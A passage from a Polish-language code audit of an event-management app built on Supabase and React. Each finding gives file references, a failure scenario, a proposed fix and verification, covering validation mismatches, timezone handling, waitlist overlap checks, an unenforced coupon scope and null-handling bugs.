**Naprawa.** Dodac `'refunded'` do `PACKAGE_ORDER_STATUSES` i do slownika `adminEventRegistration.packages.orders.statuses.*`, a `orderStatus()` zamienic na pelne zawezenie po tej stale (nieznana wartosc -> pokazac wartosc surowa i zablokowac select, zamiast podmieniac ja na 'pending').

**Weryfikacja.** src/components/admin/events/organisms/EventPackagesPanel.tsx:57-59 to doslownie `return value === 'paid' || value === 'cancelled' ? value : 'pending'`, uzyte jako value selecta (:303) i przy wysylce mutacji (:311). Zrodlo dopuszcza cztery stany: CHECK event_package_orders_status_values ('pending','paid','cancelled','refunded') - supabase/migrations/20260824080000...sql:375, a admin_event_package_order_set_status […]

### [średni] Tryb wyswietlania zgody 'access' jest w interfejsie, ale nigdzie nie konsumowany - zgoda staje sie wieczyscie brakujaca

`src/lib/events/termsGroupsApi.ts:32` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`TERM_DISPLAYS = ['registration','access','registration_and_access']` i dialog pozwala wybrac kazda z tych wartosci (src/lib/events/termsGroupsDraft.ts:213-215). Kazda sciezka, ktora pokazuje albo przyjmuje zgody, filtruje jednak `display IN ('registration','registration_and_access')`: `event_registration_form` (20260828051054...sql:566), walidacja wymaganych zgod w `event_register` (20260827220945...sql:414) i wstawienie akceptacji (:150). Jednoczesnie licznik brakujacych zgod na liscie zgloszen nie filtruje po `display` w ogole (20260824090214_f14a8b5f...sql:749-763) - liczy kazda aktywna i wymagana zgode.

**Scenariusz.** Organizator dodaje regulamin wejsciowy (`display = 'access'`, `is_required = true`) - np. regulamin obiektu. Uczestnicy nigdy go nie widza (nie wchodzi do `event_registration_form`) i nie moga zaakceptowac (`event_register` go nie przyjmuje, bo nie ma go na liscie do zaakceptowania). Za to kolumna 'brakujace zgody' na liscie zgloszen pokazuje 1 przy KAZDYM uczestniku wydarzenia, na zawsze, i nie da sie tego […]

**Naprawa.** Albo domknac tryb: dodac krok akceptacji przy wejsciu (odprawa albo panel uczestnika) obslugujacy `display IN ('access','registration_and_access')`, albo - do czasu jego powstania - usunac 'access' z `TERM_DISPLAYS` w kliencie i zawezic licznik brakujacych zgod w `admin_event_registrations_list` do `display IN ('registration','registration_and_access')`.

**Weryfikacja.** TERM_DISPLAYS = ['registration','access','registration_and_access'] (src/lib/events/termsGroupsApi.ts:31-33) karmi selecta w dialogu zgody (src/components/admin/events/molecules/EventTermDialog.tsx:112-118), a termsGroupsDraft.displayOf przepuszcza 'access' (src/lib/events/termsGroupsDraft.ts:212-215). Grep po 'display IN' w migracjach daje SZESC miejsc i kazde filtruje do ('registration','registration_and_access'): […]

### [średni] Walidacja klienta przepuszcza wartosci, ktore CHECK-i bazy odrzucaja (dlugosc nazw, seats = 1, quota = 0)

`src/lib/events/packageDraft.ts:142` · niespojnosc · weryfikacja: POTWIERDZONE

Trzy rozjazdy naraz. (1) Walidacja dopuszcza `seats >= 1` (packageDraft.ts:141-144, komentarz w naglowku wprost: "jedno miejsce to zwykly bilet - dopuszczamy je"), baza wymaga `seats BETWEEN 2 AND 1000` (20260824080000...sql:274). (2) `quota` przechodzi dla zera (:151-156, odrzucane sa dopiero wartosci ujemne), baza wymaga `quota IS NULL OR quota > 0` (:277). (3) Nazwy: klient limituje do `TICKET_MAX_NAME = 200` (src/lib/events/ticketDraft.ts:28, uzyte i dla biletow - ticketDraft.ts:240-245, i dla pakietow - packageDraft.ts:128-133, oraz jako `maxLength` w obu dialogach), a baza wymaga `char_length(btrim(name_pl)) BETWEEN 2 AND 80` (20260824085456...sql:246 dla biletow, 20260824080000...sql:265 dla pakietow). Kazdy z tych przypadkow wraca jako 23514, ktorego `adminRegistrationFailure` nie umie zmapowac (adminRegistrationErrors.ts:63) - organizator widzi 'cos poszlo nie tak'. Blad jest utrwalony w tescie: src/lib/events/**tests**/packageDraft.test.ts:48 asercja `seats: '1'` -> […]

**Scenariusz.** Organizator wpisuje nazwe biletu 'Wejsciowka jednodniowa z lunchem i dostepem do strefy warsztatowej' (86 znakow) i klika Zapisz. Formularz nie zglasza nic, RPC leci, Postgres odrzuca na `event_ticket_types_name_pl_len`, toast mowi 'cos poszlo nie tak' bez wskazania pola. To samo dla pakietu z jednym miejscem i dla pakietu z pula 0.

**Naprawa.** Zrownac stale z CHECK-ami: `TICKET_MAX_NAME = 80` (i minimum 2 znaki), `seats >= 2` w `packageDraftIssue`, `quota >= 1` gdy pole niepuste; poprawic asercje w packageDraft.test.ts. Niezaleznie od tego dolozyc do `adminRegistrationFailure` rozpoznanie bledu 23514 po nazwie naruszonego ograniczenia (PostgREST podaje ja w `details`/`message`), zeby przyszle rozjazdy nie konczyly sie komunikatem 'unknown'.

**Weryfikacja.** (1) seats: src/lib/events/packageDraft.ts:141-144 odrzuca dopiero seats < 1, a komentarz naglowka (:8-11) jawnie dopuszcza jedno miejsce; baza wymaga event_ticket_packages_seats_range CHECK (seats BETWEEN 2 AND 1000) - supabase/migrations/20260824080000...sql:274. (2) quota: packageDraft.ts:151-156 odrzuca tylko wartosci ujemne, wiec '0' przechodzi, a packageDraftToInput oddaje 0 (:191); baza wymaga quota IS NULL OR […]

### [średni] Zakres wydarzeniowy kuponu nie jest egzekwowany na jedynej zywej sciezce realizacji

`supabase/migrations/20260721070203_a0e336e0-eaf3-4342-9435-40e076ebf0dd.sql:111` · bezpieczenstwo · weryfikacja: POTWIERDZONE

Migracja 20260824080000 dolozyla do `b2b_coupons` kolumny `event_ids`, `ticket_type_ids`, `package_ids`, `max_redemptions_per_user` i egzekwuje je w `event_admission_quote` (20260824080000...sql:940-966). Ta funkcja jest jednak martwa - jedyne trafienie `event_admission_quote` w src/ to wygenerowany src/integrations/supabase/types.ts:23480. Realna kasa wola `validate_b2b_coupon` (src/lib/billing/checkout.functions.ts:268-275), a jej cialo sprawdza tylko `active`, okno waznosci, `max_redemptions`, `plan_ids` i walute - zadnej z nowych kolumn ani limitu na osobe. Kupon wydarzeniowy ma `plan_ids = '{}'`, a pusta tablica znaczy 'bez zawezenia', wiec warunek planu tez go przepuszcza.

**Scenariusz.** Marketing tworzy kupon PROMO50 (-50%) z `event_ids = {konferencja_A}`, `max_redemptions = 200`, `max_redemptions_per_user = 1`. Kod trafia do newslettera. Jedna osoba uzywa go 200 razy - `validate_b2b_coupon` nie liczy uzyc per osoba - i to nie na konferencji A, tylko na dowolnym platnym zakupie w platformie (bilet innego wydarzenia, tresc jednorazowa, plan bez `plan_ids`). Kupon nie odmawia; po prostu obniza cene […]

**Naprawa.** Rozszerzyc `validate_b2b_coupon` o argumenty `_event_id`, `_ticket_type_id`, `_package_id` (albo o jeden `_scope jsonb`) i powtorzyc w niej warunki z `event_admission_quote`: zawezenie tablicowe + `max_redemptions_per_user` liczony z `b2b_coupon_redemptions` po `auth.uid()`. Przekazac te wartosci z checkout.functions.ts w galezi `isEventTicket`. Alternatywnie - jesli `event_admission_quote` ma byc zrodlem prawdy - […]

**Weryfikacja.** validate_b2b_coupon (supabase/migrations/20260721070203_a0e336e0...sql:111-158, jedyna definicja w repo) sprawdza wylacznie: pusty kod, kwote, active (:132), valid_from/valid_until (:135-141), max_redemptions (:142-144) i plan_ids (:145-148) - zadnego event_ids, ticket_type_ids, package_ids ani max_redemptions_per_user; przy discount_kind='percent' nie sprawdza nawet waluty (:149-151). To ona jest wolana na zywej […]

---

## Agenda i sesje

> Warstwa bazodanowa E4 jest dojrzała i naprawdę egzekwuje reguły: `event_sessions` ma generowany `time_range` (przedział półotwarty `[)`), ograniczenie EXCLUDE `event_sessions_room_no_overlap` na kolizję sali, trigger `tg_event_sessions_validate` (okno wydarzenia, limit vs pojemność sali, jednopoziomowe gniezdżenie), a `event_session_signup` blokuje kolizję czasową uczestnika pod `pg_advisory_xact_lock` i limit miejsc pod `FOR UPDATE` z listą rezerwową FIFO. Kryterium odbioru E4 („zapis na dwie sesje o tej samej godzinie odrzucany serwerowo”) jest więc zaimplementowane W BAZIE, ale warunkowo: działa wyłącznie gdy `allow_overlap = false` na OBU sesjach, a kolumna i formularz mają domyślnie `true` — czyli „z pudełka” blokada nie działa; dodatkowo awans z listy rezerwowej ustawia `registered` bez ponownego sprawdzenia kolizji. Panel admina pokrywa ścieżki, sale, sesje, siatkę czasu i raport kolizji, natomiast trzy całe zdolności mają RPC, hooki i słowniki, a NIE mają żadnego UI: obsada sesji prelegentami (`admin_event_session_speakers_set`), zapisy na sesję w panelu […]

### [wysoki] Awans z listy rezerwowej omija kontrolę kolizji czasowej — łamie kryterium odbioru E4 tylną drogą

`supabase/migrations/20260824084741_5e079502-9770-4b2f-a8cd-5e9a4535d64e.sql:660` · blad · weryfikacja: POTWIERDZONE

Gałąź rezygnacji promuje najstarszy wiersz z listy rezerwowej bezwarunkowo: `UPDATE public.event_session_signups SET status = 'registered' WHERE tenant_id = v_tenant AND session_id = v_session_id AND user_id = v_promoted;` (linie 660-663). Nie ma tu ani `pg_advisory_xact_lock`, ani zapytania o `s2.time_range && v_session.time_range`, które chroni ścieżkę zwykłego zapisu (linie 686-716). Tymczasem kontrola przy zapisie liczy tylko wiersze o statusie `registered` (`AND g2.status = 'registered'`, linia 700), więc bycie na liście REZERWOWEJ sesji A nie blokuje zapisu na kolidującą sesję B — i słusznie. Ale gdy ktoś zwolni miejsce w A, promocja zamienia ten status na `registered` bez ponownego sprawdzenia i użytkownik ląduje jako `registered` na dwóch nachodzących sesjach oznaczonych `allow_overlap = false`. Stan ten nie jest też raportowany: `admin_event_agenda_conflicts` nie ma rodzaju „kolizja uczestnika".

**Scenariusz.** Sesje A i B: 10:00-11:00, obie `allow_overlap = false`, `requires_signup = true`, A ma `capacity = 1`. Użytkownik U zapisuje się na A — miejsce zajęte przez kogoś innego, więc dostaje `waitlist`. U zapisuje się na B — przechodzi, bo kontrola liczy tylko `registered`. Posiadacz miejsca w A rezygnuje. `event_session_signup` promuje U na `registered` w A. U jest teraz zapisany na dwie sesje o tej samej godzinie, obie z […]

**Naprawa.** W pętli awansu wybierać pierwszego kandydata, który NIE ma kolidującego zapisu: dodać do `SELECT g.user_id INTO v_promoted` warunek `AND (v_session.allow_overlap OR NOT EXISTS (SELECT 1 FROM event_session_signups g3 JOIN event_sessions s3 ON s3.id = g3.session_id AND s3.tenant_id = g3.tenant_id WHERE g3.tenant_id = v_tenant AND g3.user_id = g.user_id AND g3.status = 'registered' AND s3.status = 'published' AND […]

**Weryfikacja.** supabase/migrations/20260824084741_5e079502-9770-4b2f-a8cd-5e9a4535d64e.sql:653-665: po rezygnacji wybierany jest najstarszy `status = 'waitlist'` i wykonywany bezwarunkowy `UPDATE public.event_session_signups SET status = 'registered' WHERE tenant_id = v_tenant AND session_id = v_session_id AND user_id = v_promoted;` - żadnego `pg_advisory_xact_lock`, żadnego sprawdzenia `s2.time_range && v_session.time_range`. […]

### [wysoki] Brak jakiegokolwiek UI do obsadzania sesji prelegentami — cała gałąź „prelegent w sesji” jest nieosiągalna z panelu

`src/lib/events/useEventSessions.ts:258` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`useSetSessionSpeakers` (linia 258) i `setSessionSpeakers` (src/lib/events/sessionsApi.ts:395) nie mają ani jednego konsumenta: `rg -n "useSetSessionSpeakers" src/ --glob '!**/__tests__/**'` zwraca wyłącznie definicję. `EventSessionDialog.tsx` nie ma sekcji obsady (jedyne sekcje to tytuły, czas, ścieżka/sala/rodzic, zapisy, adresy — linie 189-351), a `EventTrackWorkspace.tsx:14-15` wprost pisze „OBSADA JEST WYLICZANA, NIE WPISYWANA. Prelegent nalezy do SESJI" i pokazuje tylko odczyt przez `admin_event_track_speakers`. Ekran Content > Prelegenci obsadza WYDARZENIE (`event_speaker_entries`), a nie sesję. Skutkiem jest, że `event_session_speakers` nigdy nie dostaje wiersza z panelu, więc: chipy prelegentów w `event_agenda` są zawsze puste, `speakers_count` na liście sesji zawsze 0, kolizja `speaker_overlap` w raporcie nigdy nie zachodzi, a serwerowa blokada `speaker_overlap` w `admin_event_session_speakers_set` nie ma jak zostać wywołana. Słownik ma już komplet etykiet dla […]

**Scenariusz.** Organizator wchodzi w Content > Ścieżki > pasmo > Sesje, otwiera sesję i nie znajduje żadnego pola „Prelegenci". Wraca na Content > Prelegenci, dodaje piecioro osób — i widzi, że lista sesji nadal pokazuje „0 prelegentów", raport kolizji jest zawsze pusty, a publiczna karta sesji nie ma nikogo. Kryterium E4 „role prelegentów" jest niewykonalne z interfejsu.

**Naprawa.** Dodać do `EventSessionDialog` (albo do zapowiadanej w §8 trasy szczegółu sesji) sekcję obsady na `useSetSessionSpeakers` + `admin_event_speakers_list` jako źródło kandydatów, z kolumnami rola / kolejność / `allow_overlap` — wszystkie etykiety już są w i18n-admin-event-agenda.ts:380-389.

**Weryfikacja.** `rg -n "useSetSessionSpeakers|setSessionSpeakers|admin_event_session_speakers_set|session_speakers" src/` daje wyłącznie: definicje (src/lib/events/useEventSessions.ts:34,258,264; src/lib/events/sessionsApi.ts:395,399), typy generowane (src/integrations/supabase/types.ts:8269,20420) i test (src/lib/events/**tests**/sessionsApi.test.ts:85,138,258) - ZERO komponentów. EventSessionDialog.tsx nie ma sekcji obsady […]

### [wysoki] Formularz sesji zapisuje godziny w strefie przeglądarki, a lista i podpowiedź twierdzą, że to strefa wydarzenia

`src/lib/events/sessionDraft.ts:94` · blad · weryfikacja: POTWIERDZONE

`fromLocalInput` robi `new Date(value)` na wartości `datetime-local`, co ECMAScript parsuje w strefie LOKALNEJ przeglądarki, a `toLocalInput` (linie 86-90) odczytuje z powrotem `date.getHours()` — również lokalnie. Tymczasem dialog wyświetla `t("adminEventAgenda.sessionDialog.timeZoneHint", { zone: timeZoneLabel })` (EventSessionDialog.tsx:184 i :222), gdzie `timeZoneLabel` to identyfikator IANA wydarzenia (`eventTimeZone({ timezone: row.timezone })`, EventStudioModuleSections.tsx:171), a lista sesji formatuje `new Intl.DateTimeFormat(..., { timeZone: timeZoneLabel })` (AgendaSessionsPanel.tsx:158-163). Repozytorium ma dedykowany moduł strefy (`src/lib/events/timezone.ts`) i sam komentarz w sessionsApi.ts:260 deklaruje „ISO z offsetem - strefa wydarzenia zyje w warstwie widoku" — ale konwersji odwrotnej (strefa wydarzenia -> UTC) nigdzie nie ma. Trzecia konwencja jest w warsztacie pasma: EventTrackWorkspace.tsx:66-70 formatuje `toLocaleString` bez `timeZone`, więc godziny pasma (linia […]

**Scenariusz.** Redaktor w Europe/Warsaw edytuje kongres z `timezone = 'America/New_York'`. Wpisuje w formularzu 09:00 -> zapisuje się 09:00 CET = 03:00 EST. Lista sesji tuż obok pokazuje „03:00", siatka czasu stawia kafel na 3 rano, a po ponownym otwarciu dialogu pole znowu pokazuje 09:00 — czyli edycja i odczyt zgadzają się ze sobą, a z resztą panelu i z publiczną agendą nie. Przy odwrotnym kierunku (redaktor w Nowym Jorku, […]

**Naprawa.** Dodać do `src/lib/events/timezone.ts` parę `zonedInputToIso(value, timeZone)` / `isoToZonedInput(iso, timeZone)` (offset liczony przez `Intl.DateTimeFormat(...).formatToParts` na kandydacie, jak już robi `minutesInEventDay` w agendaTimeline.ts:72-108) i przekazać `timeZoneLabel` do `sessionDraftFromRow` / `sessionDraftToInput`; równolegle przestawić `EventTrackWorkspace.timeLabel` na `formatEventDateTime(value, […]

**Weryfikacja.** Sprawdzone w kodzie. src/lib/events/sessionDraft.ts:94-97 `fromLocalInput` robi `new Date(value).toISOString()` na surowej wartości `datetime-local` (parsowanie w strefie przeglądarki), a sessionDraft.ts:82-91 `toLocalInput` odczytuje `getFullYear/getMonth/getHours` - też lokalnie. Nie ma żadnej konwersji strefa-wydarzenia -> UTC: `rg -n "fromLocalInput|toLocalInput" src/` daje tylko sessionDraft.ts, […]

### [wysoki] Prelegent bez konta znika z publicznej agendy — `event_agenda` ma INNER JOIN na `profiles`

`supabase/migrations/20260824084741_5e079502-9770-4b2f-a8cd-5e9a4535d64e.sql:564` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Boczne zapytanie obsady w `event_agenda` składa: `JOIN public.speaker_profiles spf ON spf.id = es.speaker_profile_id AND spf.tenant_id = v_tenant AND spf.is_public` oraz `JOIN public.profiles pr ON pr.id = spf.user_id AND pr.tenant_id = v_tenant` — oba INNER. Dla prelegenta z kartoteki `speaker_profiles.user_id IS NULL` (CHECK `speaker_profiles_subject_xor`, 20260826180000_event_speaker_person.sql:169-176), więc drugi JOIN nie trafia i osoba wypada z `speakers` bez błędu. Migracja 20260826180000 sama to nazywa i świadomie odkłada (linie 42-46: „NIE rusza `event_agenda`. Projekcja agendy ma `JOIN profiles` i tez gubi osobe bez konta (…) Zmiana wchodzi PO scaleniu tamtej galezi"), ale tamta gałąź jest już scalona — `agendaSurface.ts` i `eventPublicSurface.test.ts` istnieją w repo, a poprawki nie ma. Dokładnie ten sam defekt naprawiono w `event_speakers_public` LEFT JOIN-em (20260827150000:...:220-226).

**Scenariusz.** Organizator wpisuje przez „Utwórz ręcznie" prelegenta bez konta, dodaje go do obsady sesji (RPC `admin_event_session_speakers_set` przyjmuje jego `speaker_profile_id`), publikuje sesję. Sekcja Prelegenci na stronie wydarzenia pokazuje go poprawnie (`event_speakers_public`), ale karta sesji w agendzie ma pustą listę prelegentów — panel mówi „1 prelegent", strona publiczna nie pokazuje żadnego, bez śladu w logu.

**Naprawa.** Przepisać boczne zapytanie obsady w `event_agenda` wzorem `event_speakers_public`: `LEFT JOIN profiles pr ON pr.id = spf.user_id AND pr.tenant_id = v_tenant`, `LEFT JOIN event_people pe ON pe.id = spf.person_id AND pe.tenant_id = v_tenant`, nazwisko przez `COALESCE(pr.display_name, btrim(pe.first_name||' '||pe.last_name))`, awatar przez `COALESCE(pr.avatar_url, pe.photo_url)`, i odsiać wiersz dopiero warunkiem […]

**Weryfikacja.** supabase/migrations/20260824084741_5e079502-9770-4b2f-a8cd-5e9a4535d64e.sql:559-566: bok obsady to `JOIN public.speaker_profiles spf ON spf.id = es.speaker_profile_id AND spf.tenant_id = v_tenant AND spf.is_public` oraz `JOIN public.profiles pr ON pr.id = spf.user_id AND pr.tenant_id = v_tenant` - oba INNER, a jsonb_build_object bierze `pr.id/pr.slug/pr.display_name` (linie 548-552). Sprawdziłem, czy poprawka nie […]

### [średni] Kryterium odbioru E4 nie działa przy ustawieniach domyślnych: `allow_overlap` domyślnie zezwala na kolizję

`supabase/migrations/20260823140000_event_sessions.sql:457` · niespojnosc · weryfikacja: POTWIERDZONE

Kolumna ma `allow_overlap boolean NOT NULL DEFAULT true`, a blokada w `event_session_signup` startuje dopiero od `IF NOT v_session.allow_overlap THEN` i dodatkowo wymaga `AND s2.allow_overlap = false` na drugiej sesji (20260824084741_...sql:686 i 706). Formularz panelu powiela ten domyślny stan: `emptySessionDraft` ustawia `allowOverlap: true` (src/lib/events/sessionDraft.ts:74), a przełącznik nosi etykietę „Pozwól na udział w nachodzących sesjach" BEZ podpowiedzi (src/lib/i18n-admin-event-agenda.ts:144 — klucza `allowOverlapHint` w namespace `sessionDialog` nie ma, istnieje tylko w namespace obsady prelegentów, linia 385). Kryterium §8 mówi natomiast bezwarunkowo: „zapis na dwie sesje o tej samej godzinie jest **odrzucany serwerowo**". Reguła jest więc zaimplementowana, ale wyłączona dopóki redaktor nie odznaczy przełącznika na OBU sesjach — a nic w interfejsie mu tego nie mówi.

**Scenariusz.** Organizator wpisuje agendę dwudniową z 30 sesjami klikając „Zapisz" na domyślnych ustawieniach. Wszystkie sesje mają `allow_overlap = true`. Uczestnik zapisuje się na dwie równoległe sesje o 10:00 i oba zapisy przechodzą — mimo że dokument odbioru mówi, że mają być odrzucone. Odbiór etapu na podstawie samego kliknięcia w panelu wypada negatywnie, choć w bazie kod jest.

**Naprawa.** Albo odwrócić domyślną wartość (`DEFAULT false` w kolumnie + `allowOverlap: false` w `emptySessionDraft`), albo — jeśli furtka ma zostać domyślna — dopisać `sessionDialog.allowOverlapHint` z jawnym zdaniem „Wyłączenie na OBU sesjach blokuje podwójny zapis uczestnika" i pokazywać na liście sesji plakietkę dla sesji z włączoną furtką.

**Weryfikacja.** Fakty się zgadzają: supabase/migrations/20260823140000_event_sessions.sql:457 `allow_overlap boolean NOT NULL DEFAULT true`; blokada startuje od `IF NOT v_session.allow_overlap THEN` (20260824084741:685) i wymaga `AND s2.allow_overlap = false` na drugiej sesji (tamże:706). src/lib/events/sessionDraft.ts:74 `allowOverlap: true` w `emptySessionDraft`. Etykieta bez podpowiedzi: src/lib/i18n-admin-event-agenda.ts:146 […]

### [średni] Licznik „sesje bez pasma” w diagramie struktury jest zawsze zerowy (porównanie UUID z pustym napisem)

`src/components/admin/events/organisms/AgendaTracksPanel.tsx:211` · blad · weryfikacja: POTWIERDZONE

`unassignedCount={(sessionsQ.data ?? []).filter((row) => row.track_id === "").length}` — i identycznie w `src/components/admin/events/organisms/AgendaSessionsPanel.tsx:206`. `admin_event_sessions_list` zwraca `s.track_id` jako surową kolumnę `uuid` bez COALESCE (20260823140000_event_sessions.sql:1391), więc sesja bez ścieżki przychodzi jako `null`, a `null === ""` jest w JS fałszem. Kod kompiluje się, bo wygenerowane typy Supabase deklarują `track_id: string` bez `| null` (src/integrations/supabase/types.ts:20463) — TypeScript nie ma jak tego złapać. Skutek: `AgendaStructureDiagram` dostaje `unassignedCount = 0`, a jego gałąź `unassignedCount > 0` (AgendaStructureDiagram.tsx:47-56) nigdy nie dorysowuje kolumny „Bez ścieżki" — czyli dokładnie tego stanu, który komentarz w linii 27 tego pliku nazywa „normalnym stanem, nie błędem".

**Scenariusz.** Wydarzenie ma 30 sesji, z których 8 nie jest jeszcze przypiętych do żadnego pasma. Diagram nad listą ścieżek sumuje 22 kafle w kolumnach pasm i nie pokazuje kolumny „Bez ścieżki". Organizator odczytuje z niego, że cały program jest już rozpisany, i publikuje wydarzenie z ośmioma sesjami niewidocznymi w żadnym paśmie.

**Naprawa.** Zmienić predykat na `row.track_id === null || row.track_id === ""` w obu miejscach (albo dodać w RPC `COALESCE(s.track_id::text, '')`, jeśli kontrakt ma zostać niezmienny). Docelowo: przejrzeć wszystkie porównania `=== ""` na kolumnach nullowalnych z RPC agendy.

**Weryfikacja.** src/components/admin/events/organisms/AgendaTracksPanel.tsx:211 `unassignedCount={(sessionsQ.data ?? []).filter((row) => row.track_id === "").length}` oraz identycznie src/components/admin/events/organisms/AgendaSessionsPanel.tsx:206. RPC zwraca `s.track_id` surowo, bez COALESCE (supabase/migrations/20260823140000_event_sessions.sql:1392 `s.track_id, t.key, t.name_pl, t.name_en, t.accent_color`), a kolumna jest […]

### [średni] Okno przypinania sesji do pasma oznacza każdą sesję BEZ pasma plakietką „przenosi z” z pustą nazwą

`src/components/admin/events/molecules/TrackSessionsLinkDialog.tsx:143` · blad · weryfikacja: POTWIERDZONE

`const otherTrack = row.track_id !== "" && (track === null || row.track_id !== track.id);` — pierwszy człon ma odsiać sesje bez ścieżki, ale dla nich `track_id` jest `null`, a `null !== ""` jest prawdą, więc `otherTrack` wychodzi `true`. Renderowana jest wtedy plakietka `t("adminEventAgenda.tracks.link.movesFrom", { track: trackNameOf(row) })`, gdzie `trackNameOf` (linia 88) zwraca `row.track_name_pl || row.track_name_en` — dla sesji bez pasma obie kolumny są NULL-ami, więc do interpolacji wchodzi pusty podmiot. Dwie linie niżej ten sam błąd: `row.room_name === "" ? t("...noRoom") : row.room_name` (linia 157) — `room_name` to `r.name` z LEFT JOIN (20260823140000_event_sessions.sql:1392), czyli NULL dla sesji bez sali, więc zamiast „Bez sali" React renderuje nic.

**Scenariusz.** Organizator otwiera „Przypnij sesje" w paśmie „Energia". Wszystkie 8 nieprzypiętych sesji ma czerwoną plakietkę „Przenosi z: " (bez nazwy) — a to jest właśnie ostrzeżenie, które ma odróżnić sesję zabieraną INNEMU pasmu od sesji wolnej. Ostrzeżenie traci znaczenie, a wiersze sesji bez sali są wizualnie ucięte do samego czasu trwania.

**Naprawa.** `const otherTrack = row.track_id !== null && row.track_id !== "" && (track === null || row.track_id !== track.id);` oraz `row.room_name === null || row.room_name === "" ? t("adminEventAgenda.sessions.noRoom") : row.room_name`.

**Weryfikacja.** src/components/admin/events/molecules/TrackSessionsLinkDialog.tsx:142-143: `const otherTrack = row.track_id !== "" && (track === null || row.track_id !== track.id);` - przy `track_id === null` pierwszy człon jest prawdą, więc plakietka `movesFrom` renderuje się dla sesji BEZ pasma (linie 163-167), a `trackNameOf` (linie 87-88: `isEn ? row.track_name_en || row.track_name_pl : row.track_name_pl || row.track_name_en`) […]

### [średni] Przywrócenie odwołanej sesji do zajętej sali zwraca surowy błąd Postgresa i toast „Operacja się nie udała”

`supabase/migrations/20260824084741_5e079502-9770-4b2f-a8cd-5e9a4535d64e.sql:81` · blad · weryfikacja: POTWIERDZONE

`admin_event_sessions_set_status` (linie 81-142) wykonuje `UPDATE public.event_sessions SET status = v_status ...` i kończy się zwykłym `RETURN v_changed; END;` — bez sekcji `EXCEPTION WHEN exclusion_violation`, którą ma bliźniacze `admin_event_session_save` (20260823140000_event_sessions.sql:1867-1871: `WHEN exclusion_violation THEN RAISE EXCEPTION 'room_conflict: room already taken in this slot'`). Ograniczenie `event_sessions_room_no_overlap` obejmuje wszystkie sesje `status <> 'cancelled'`, więc odwołanie sesji ZWALNIA slot sali, a przywrócenie go zajmuje z powrotem. Wtedy z bazy leci komunikat `conflicting key value violates exclusion constraint "event_sessions_room_no_overlap"` — bez dwukropka i bez małoliterowej głowy, więc `adminAgendaFailure` odbija go na `/^[a-z][a-z0-9_]*$/` (src/lib/events/adminAgendaErrors.ts:54) i schodzi na `adminEventAgenda.errors.unknown`. Klucz `roomConflict` z gotowym zdaniem „Sala jest już zajęta w tym przedziale godzin." istnieje […]

**Scenariusz.** Sesja „Panel energetyczny" 14:00-15:00 w Sali A zostaje odwołana. Redaktor wstawia w to miejsce inną sesję w Sali A. Następnego dnia decyzja się zmienia i klika „Opublikuj" na odwołanym panelu — dostaje toast „Operacja się nie udała. Spróbuj ponownie." i klika jeszcze trzy razy, bo komunikat sugeruje awarię przejściową, a nie zajętą salę.

**Naprawa.** Dopisać do `admin_event_sessions_set_status` blok `EXCEPTION WHEN exclusion_violation THEN RAISE EXCEPTION 'room_conflict: room already taken in this slot';` — identycznie jak w `admin_event_session_save`. Warto też dodać przypadek do scripts/events-harness/runtime_test.d/10_sessions.sql obok istniejącej asercji `room_conflict` z linii 371.

**Weryfikacja.** supabase/migrations/20260824084741_5e079502-9770-4b2f-a8cd-5e9a4535d64e.sql:81-141: `admin_event_sessions_set_status` robi `UPDATE public.event_sessions SET status = v_status ...` w pętli `FOR v_rec IN ... RETURNING` i kończy się `RETURN v_changed; END;` - bez sekcji EXCEPTION. Bliźniacze `admin_event_session_save` ma ją wprost: `EXCEPTION WHEN exclusion_violation THEN RAISE EXCEPTION 'room_conflict: room already […]

### [średni] Raport kolizji prelegenta gubi połowę par międzywydarzeniowych — brak filtra `sb.event_id` przy asymetrycznym `sa.id < sb.id`

`supabase/migrations/20260824084741_5e079502-9770-4b2f-a8cd-5e9a4535d64e.sql:357` · blad · weryfikacja: POTWIERDZONE

Warunki członu `speaker_overlap` to `WHERE ea.tenant_id = v_tenant AND sa.event_id = p_event_id AND sa.id < sb.id ...` — filtr wydarzenia stoi WYŁĄCZNIE na `sa`, a łączenie `eb`/`sb` idzie po samym `tenant_id`. Serwerowa blokada w `admin_event_session_speakers_set` świadomie liczy po całym najemcy („Liczy sie po CALYM tenancie, nie po jednym wydarzeniu", 20260824084741_...sql:203-205), więc raport MIAŁ pokazywać to samo. Ale połączenie „bez filtra na sb" z „deduplikacją przez `sa.id < sb.id`" daje wynik zależny od losowej kolejności UUID: para (sesja z tego wydarzenia, sesja z innego wydarzenia) jest raportowana tylko wtedy, gdy identyfikator tej pierwszej jest mniejszy. Dodatkowo `subject_name` bierze się z `LEFT JOIN public.profiles pr ON pr.id = spf.user_id` (linia 354), więc dla prelegenta z kartoteki (`user_id IS NULL`) nazwa podmiotu jest NULL-em.

**Scenariusz.** Ten sam moderator jest obsadzony w sesji kongresu marcowego i w sesji seminarium listopadowego, oba w tym samym najemcy i o tej samej godzinie, obie pozycje z `allow_overlap = false`. Otwarcie /content/conflicts kongresu pokazuje kolizję albo jej nie pokazuje — zależnie wyłącznie od tego, który UUID sesji jest mniejszy. Przy dwóch prawie identycznych wydarzeniach organizator dostaje sprzeczne odpowiedzi z tego […]

**Naprawa.** Rozstrzygnąć zakres jawnie: albo dopisać `AND sb.event_id = p_event_id` (raport tylko w obrębie wydarzenia, co czyni `sa.id < sb.id` poprawną deduplikacją), albo zostawić zakres najemcy i zamienić deduplikację na `AND (sb.event_id <> p_event_id OR sa.id < sb.id)`. Przy okazji podmienić `pr.display_name` na `COALESCE(pr.display_name, btrim(pe.first_name||' '||pe.last_name))` z `LEFT JOIN event_people pe ON pe.id = […]

**Weryfikacja.** supabase/migrations/20260824084741_5e079502-9770-4b2f-a8cd-5e9a4535d64e.sql:355-366: `WHERE ea.tenant_id = v_tenant AND sa.event_id = p_event_id AND sa.id < sb.id AND ea.allow_overlap = false AND eb.allow_overlap = false ...` - filtr wydarzenia stoi tylko na `sa`, a `sb` dołącza się po `sb.tenant_id = eb.tenant_id` (linia 350-351), czyli po całym najemcy. Dla pary międzywydarzeniowej tylko jeden kierunek jest w […]

### [średni] Wskazówka dojścia do sali nigdy nie trafia na ekran (piętro NULL zamiast pustego napisu)

`src/components/admin/events/organisms/AgendaRoomsPanel.tsx:117` · blad · weryfikacja: POTWIERDZONE

